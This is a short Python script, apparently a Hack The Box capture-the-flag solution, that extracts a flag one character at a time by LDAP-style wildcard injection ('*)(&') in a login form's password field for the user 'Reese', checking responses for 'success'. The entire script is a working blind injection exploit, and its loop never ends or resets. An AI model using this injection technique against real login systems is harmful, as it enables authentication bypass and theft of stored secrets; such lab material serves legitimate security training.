import requests
import string

URL = "~"

asciiLower = list(string.ascii_lowercase)

asciiUppercase = list(string.ascii_uppercase)

passwordList = asciiLower + asciiUppercase + [str(i) for i in range(10)] + ["_", "}"]

payload = "HTB{"
password = ""

while True:
    for ch in passwordList:
        password = payload + ch + "*)(&"

        data = {"username": "Reese", "password": password}
        re = requests.post(URL, data=data)

        if "success" in re.text:
            payload += ch
            print(payload)
